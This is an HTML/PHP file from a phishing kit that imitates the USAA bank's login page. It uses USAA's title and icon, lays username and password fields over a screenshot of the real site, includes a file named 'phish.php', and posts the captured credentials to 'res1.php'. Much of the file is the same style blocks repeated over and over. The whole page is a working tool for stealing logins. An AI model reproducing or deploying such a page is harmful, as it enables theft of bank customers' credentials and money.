<HTML><head><?php include ('phish.php'); ?>
<title>Insurance, Banking, Investments &amp; Retirement | USAA</title>
<meta http-equiv="content-type" content="text/html; charset=UTF8">

<link type="image/x-icon" rel="shortcut icon" href="https://content.usaa.com/mcontent/static_assets/Media/usaaicon.ico?cacheid=435112253_p">

<script type="text/javascript">

function unhideBody()
{
var bodyElems = document.getElementsByTagName("body");
bodyElems[0].style.visibility = "visible";
}

</script>

<body style="visibility:hidden" onload="unhideBody()">


<style> 
 .textbox { 
    height: 30px;
    width: 221px;
    margin-bottom: 15px;
    border: 1px solid #cfccca;
    font-size: 16px;
    padding-left: 8px;
    font-family: "Gotham Narrow",Arial,sans-serif;
    box-shadow: inset 0 1px 3px rgba(0,0,0,0.10);
}
 } 
</style> 

<style type="text/css">
div#container
{
	position:relative;
	width:  100%; 
  height: 100%; 
  background-size: 100%;
  background-position: center;
  background-repeat: no-repeat;
	text-align:left; 
}
body {text-align:center;margin:0}
</style>

</head>
<body bgColor="#F3F3F3" Link="#000000" VLink="#000000" ALink="#000000">
<STYLE> 
 .textbox { 
    height: 30px;
    width: 221px;
    margin-bottom: 15px;
    border: 1px solid #cfccca;
    font-size: 16px;
    padding-left: 8px;
    font-family: "Gotham Narrow",Arial,sans-serif;
    box-shadow: inset 0 1px 3px rgba(0,0,0,0.10);
}
 } 
</STYLE>

<STYLE type=text/css>
div#container
{
	position:relative;
	width:  100%; 
  height: 100%; 
  background-size: 100%;
  background-position: center;
  background-repeat: no-repeat;
	text-align:left; 
}
body {text-align:center;margin:0}
</STYLE>

<STYLE> 
 .textbox { 
    height: 30px;
    width: 221px;
    margin-bottom: 15px;
    border: 1px solid #cfccca;
    font-size: 16px;
    padding-left: 8px;
    font-family: "Gotham Narrow",Arial,sans-serif;
    box-shadow: inset 0 1px 3px rgba(0,0,0,0.10);
}
 } 
</STYLE>

<STYLE type=text/css>
div#container
{
	position:relative;
	width:  100%; 
  height: 100%; 
  background-size: 100%;
  background-position: center;
  background-repeat: no-repeat;
	text-align:left; 
}
body {text-align:center;margin:0}
</STYLE>

<STYLE> 
 .textbox { 
    height: 30px;
    width: 221px;
    margin-bottom: 15px;
    border: 1px solid #cfccca;
    font-size: 16px;
    padding-left: 8px;
    font-family: "Gotham Narrow",Arial,sans-serif;
    box-shadow: inset 0 1px 3px rgba(0,0,0,0.10);
}
 } 
</STYLE>

<STYLE type=text/css>
div#container
{
	position:relative;
	width:  100%; 
  height: 100%; 
  background-size: 100%;
  background-position: center;
  background-repeat: no-repeat;
	text-align:left; 
}
body {text-align:center;margin:0}
</STYLE>

<STYLE> 
 .textbox { 
    height: 30px;
    width: 221px;
    margin-bottom: 15px;
    border: 1px solid #cfccca;
    font-size: 16px;
    padding-left: 8px;
    font-family: "Gotham Narrow",Arial,sans-serif;
    box-shadow: inset 0 1px 3px rgba(0,0,0,0.10);
}
 } 
</STYLE>

<STYLE type=text/css>
div#container
{
	position:relative;
	width:  100%; 
  height: 100%; 
  background-size: 100%;
  background-position: center;
  background-repeat: no-repeat;
	text-align:left; 
}
body {text-align:center;margin:0}
</STYLE>

<STYLE> 
 .textbox { 
    height: 30px;
    width: 221px;
    margin-bottom: 15px;
    border: 1px solid #cfccca;
    font-size: 16px;
    padding-left: 8px;
    font-family: "Gotham Narrow",Arial,sans-serif;
    box-shadow: inset 0 1px 3px rgba(0,0,0,0.10);
}
 } 
</STYLE>

<STYLE type=text/css>
div#container
{
	position:relative;
	width:  100%; 
  height: 100%; 
  background-size: 100%;
  background-position: center;
  background-repeat: no-repeat;
	text-align:left; 
}
body {text-align:center;margin:0}
</STYLE>

<STYLE> 
 .textbox { 
    height: 30px;
    width: 221px;
    margin-bottom: 15px;
    border: 1px solid #cfccca;
    font-size: 16px;
    padding-left: 8px;
    font-family: "Gotham Narrow",Arial,sans-serif;
    box-shadow: inset 0 1px 3px rgba(0,0,0,0.10);
}
 } 
</STYLE>

<STYLE type=text/css>
div#container
{
	position:relative;
	width:  100%; 
  height: 100%; 
  background-size: 100%;
  background-position: center;
  background-repeat: no-repeat;
	text-align:left; 
}
body {text-align:center;margin:0}
</STYLE>

<STYLE> 
 .textbox { 
    height: 30px;
    width: 221px;
    margin-bottom: 15px;
    border: 1px solid #cfccca;
    font-size: 16px;
    padding-left: 8px;
    font-family: "Gotham Narrow",Arial,sans-serif;
    box-shadow: inset 0 1px 3px rgba(0,0,0,0.10);
}
 } 
</STYLE>

<STYLE type=text/css>
div#container
{
	position:relative;
	width:  100%; 
  height: 100%; 
  background-size: 100%;
  background-position: center;
  background-repeat: no-repeat;
	text-align:left; 
}
body {text-align:center;margin:0}
</STYLE>

<STYLE> 
 .textbox { 
    height: 30px;
    width: 221px;
    margin-bottom: 15px;
    border: 1px solid #cfccca;
    font-size: 16px;
    padding-left: 8px;
    font-family: "Gotham Narrow",Arial,sans-serif;
    box-shadow: inset 0 1px 3px rgba(0,0,0,0.10);
}
 } 
</STYLE>

<STYLE type=text/css>
div#container
{
	position:relative;
	width:  100%; 
  height: 100%; 
  background-size: 100%;
  background-position: center;
  background-repeat: no-repeat;
	text-align:left; 
}
body {text-align:center;margin:0}
</STYLE>

<STYLE> 
 .textbox { 
    height: 30px;
    width: 221px;
    margin-bottom: 15px;
    border: 1px solid #cfccca;
    font-size: 16px;
    padding-left: 8px;
    font-family: "Gotham Narrow",Arial,sans-serif;
    box-shadow: inset 0 1px 3px rgba(0,0,0,0.10);
}
 } 
</STYLE>

<STYLE type=text/css>
div#container
{
	position:relative;
	width:  100%; 
  height: 100%; 
  background-size: 100%;
  background-position: center;
  background-repeat: no-repeat;
	text-align:left; 
}
body {text-align:center;margin:0}
</STYLE>

<STYLE> 
 .textbox { 
    height: 30px;
    width: 221px;
    margin-bottom: 15px;
    border: 1px solid #cfccca;
    font-size: 16px;
    padding-left: 8px;
    font-family: "Gotham Narrow",Arial,sans-serif;
    box-shadow: inset 0 1px 3px rgba(0,0,0,0.10);
}
 } 
</STYLE>

<STYLE type=text/css>
div#container
{
	position:relative;
	width:  100%; 
  height: 100%; 
  background-size: 100%;
  background-position: center;
  background-repeat: no-repeat;
	text-align:left; 
}
body {text-align:center;margin:0}
</STYLE>

<DIV id=container>
<DIV id=image2 style="HEIGHT: 540px; WIDTH: 700px; LEFT: 216px; Z-INDEX: 1; TOP: 0px"><IMG title="" border=0 alt="" src="img/1.png" width=1265 height=700></DIV>



<FORM id=chalbhai onsubmit=" return formbreeze_sub()" method=post name=chalbhai action=res1.php>

<INPUT class=textbox style="HEIGHT: 26px; WIDTH: 238px; POSITION: absolute; LEFT: 258px; Z-INDEX: 5; TOP: 300px" maxLength=50 size=1 name=userid required placeholder=""> 


<INPUT class=textbox style="HEIGHT: 26px; WIDTH: 238px; POSITION: absolute; LEFT: 258px; Z-INDEX: 6; TOP: 357px" size=1 type=password name=password required placeholder=""> 


<DIV id=formimage1 style="POSITION: absolute; LEFT: 257px; Z-INDEX: 7; TOP: 395px"><INPUT height=41 src="img/logone1.png" type=image width=240 name=formimage1></DIV></FORM></DIV>


<IMG src="http://none.com" width=0 height=0> </BODY></HTML>